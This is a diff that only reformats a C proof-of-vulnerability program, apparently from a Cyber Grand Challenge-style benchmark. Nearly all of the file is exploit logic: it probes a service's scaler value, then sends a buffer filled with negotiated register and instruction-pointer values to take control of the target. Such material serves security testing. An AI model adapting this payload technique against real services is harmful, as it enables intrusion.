@@ -24,11 +24,11 @@ THE SOFTWARE.
 
 */
 
-
 #include <libpov.h>
-#include "protocol.h"
-#include "messages.h"
+
 #include "block.h"
+#include "messages.h"
+#include "protocol.h"
 
 #define SCALER_MIN 0.4
 #define SCALER_MAX 0.6
@@ -40,60 +40,58 @@ void send_payload(uint32 len, char* buf);
 
 float64 probe_splatter = 6382.74623416;
 
-int main(void)
-{
-	type1_vals t1vals;
- 	type1_negotiate(0xffffffff, 0xffffffff, 5, &t1vals);
+int main(void) {
+  type1_vals t1vals;
+  type1_negotiate(0xffffffff, 0xffffffff, 5, &t1vals);
 
-        protocol_with_recv_frame(^uint8 (protocol_frame* hello) {
-            // consume hello
-            return 0;
-          });
+  protocol_with_recv_frame(^uint8(protocol_frame* hello) {
+    // consume hello
+    return 0;
+  });
 
-        float64 scaler = SCALER_MIN;
-        uint8 check_value = 0;
-        uint8 max_check_value = 0;
-        char max_check_out[80];
-        
-        float64 scaler_delta = 0.01;
-        
-        while (check_value < 60) {
-          scaler += scaler_delta;
-          check_value = probe_new_scaler(scaler);
+  float64 scaler = SCALER_MIN;
+  uint8 check_value = 0;
+  uint8 max_check_value = 0;
+  char max_check_out[80];
 
-          if (check_value > max_check_value) {
-            max_check_value = check_value;
-          }
+  float64 scaler_delta = 0.01;
 
-          if (scaler >= SCALER_MAX) {
-            scaler = SCALER_MAX;
-            scaler_delta = (-scaler_delta) / 2;
-          }
-          else if (scaler <= SCALER_MIN) {
-            scaler = SCALER_MIN;
-            scaler_delta = (-scaler_delta) / 2;
-          }
-        }
+  while (check_value < 60) {
+    scaler += scaler_delta;
+    check_value = probe_new_scaler(scaler);
 
-        // found a plausible scaler
-        uint8 intermediate = check_value + 50;
-        uint8 buf_len = intermediate - (intermediate % 8);
-        
-        char buf[buf_len];
-        uint32 increment = sizeof(void*);
-        for (uint8 i = 0; i < buf_len; i+= 2 * increment) {
-          *(unsigned int*)&(buf[i]) = t1vals.regval;
-          *(unsigned int*)&(buf[i + increment]) = t1vals.ipval;
-        }
+    if (check_value > max_check_value) {
+      max_check_value = check_value;
+    }
 
-        send_payload(buf_len, (char*)(buf));
+    if (scaler >= SCALER_MAX) {
+      scaler = SCALER_MAX;
+      scaler_delta = (-scaler_delta) / 2;
+    } else if (scaler <= SCALER_MIN) {
+      scaler = SCALER_MIN;
+      scaler_delta = (-scaler_delta) / 2;
+    }
+  }
 
-        protocol_with_recv_frame(^uint8 (protocol_frame* hello) {
-            // consume doubler response
-            return 0;
-          });
-        
-	return 0;
+  // found a plausible scaler
+  uint8 intermediate = check_value + 50;
+  uint8 buf_len = intermediate - (intermediate % 8);
+
+  char buf[buf_len];
+  uint32 increment = sizeof(void*);
+  for (uint8 i = 0; i < buf_len; i += 2 * increment) {
+    *(unsigned int*)&(buf[i]) = t1vals.regval;
+    *(unsigned int*)&(buf[i + increment]) = t1vals.ipval;
+  }
+
+  send_payload(buf_len, (char*)(buf));
+
+  protocol_with_recv_frame(^uint8(protocol_frame* hello) {
+    // consume doubler response
+    return 0;
+  });
+
+  return 0;
 }
 
 uint8 probe_new_scaler(float64 scaler) {
@@ -105,14 +103,14 @@ uint8 probe_new_scaler(float64 scaler) {
   check_req.value = (void*)&check_req_val;
   check_req_val.pos0 = probe_splatter;
   check_req_val.pos1 = scaler;
-  
+
   protocol_send(&check_req);
   uint8 __block check_value;
-  protocol_with_recv_frame(^uint8 (protocol_frame* check_resp) {
-      check_value = ((check_resp_contents*) check_resp->value)->pos0;
-      
-      return 0;
-    });
+  protocol_with_recv_frame(^uint8(protocol_frame* check_resp) {
+    check_value = ((check_resp_contents*)check_resp->value)->pos0;
+
+    return 0;
+  });
 
   return check_value;
 }
@@ -125,6 +123,3 @@ void send_payload(uint32 len, char* buf) {
 
   protocol_send(&double_req);
 }
-
-
-
